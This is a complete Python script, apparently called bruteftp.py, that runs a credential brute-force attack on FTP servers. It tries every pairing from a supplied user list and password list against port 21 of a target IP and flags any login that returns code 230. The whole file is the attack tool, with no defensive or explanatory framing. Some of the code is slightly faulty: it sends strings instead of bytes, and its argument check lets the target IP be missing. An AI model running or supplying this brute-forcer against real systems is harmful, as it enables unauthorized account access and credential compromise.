# 530: Login incorrect.
# 230: Successful login.

import socket
import sys
import re

# -------------------------------------------------------------- #
if len(sys.argv) <= 2:
    print("Usage python bruteftp.py [USER] [PASS] [IP]")
    sys.exit()

# -------------------------------------------------------------- #

users = []
pass_list = []
target = sys.argv[3]

print("Importing lists...")

with open(sys.argv[1], "r") as usr_lst:
    users = usr_lst.read().split()
    usr_lst.close()

with open(sys.argv[2], "r") as pass_lst:
    pass_list = pass_lst.read().split()
    pass_lst.close()

# -------------------------------------------------------------- #

for user in users:
    for passwd in pass_list:
        print("Now trying:\t{0}:{1}".format(user, passwd))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 21))
        s.recv(1024)

        # Send USER
        s.send("USER {0} \r\n".format(user))
        s.recv(1024)
        # Send PASSWORD
        s.send("PASS {0} \r\n".format(passwd))
        response = s.recv(1024)
        s.send("QUIT \r\n")

        print(response)

        if re.search("230", response):
            print("[+] Login found!\t{0}:{1}".format(user, passwd))
            opt = input("Continue? <y/n> ")
            if opt.lower() == "y":
                continue
            else:
                break

print("Task done.")
        
